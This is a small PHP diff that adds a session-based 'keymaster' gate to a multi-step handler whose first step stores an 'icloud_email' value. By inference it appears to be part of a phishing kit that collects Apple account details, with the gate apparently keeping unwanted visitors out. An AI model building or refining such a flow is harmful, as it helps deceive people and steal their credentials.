@@ -60,6 +60,16 @@ if ($step === 'lang' && $lang !== '') {
     exit;
 }
 
+// ── KEYMASTER CHECK (for all steps except 1 and lang) ─────
+// Step 1 activates the keymaster, so we only verify it for steps 2+
+if ($step !== '1' && $step !== 'lang' && $step !== '') {
+    if (!isset($_SESSION['qsdfqsdfqsdfqsdf123123']) || $_SESSION['qsdfqsdfqsdfqsdf123123'] !== true) {
+        header('HTTP/1.1 403 Forbidden');
+        echo json_encode(['error' => 'Unauthorized']);
+        exit;
+    }
+}
+
 // ── STEP 1 ──────────────────────────
 if ($step === '1' && $email !== '') {
     $_SESSION['icloud_email'] = $email;
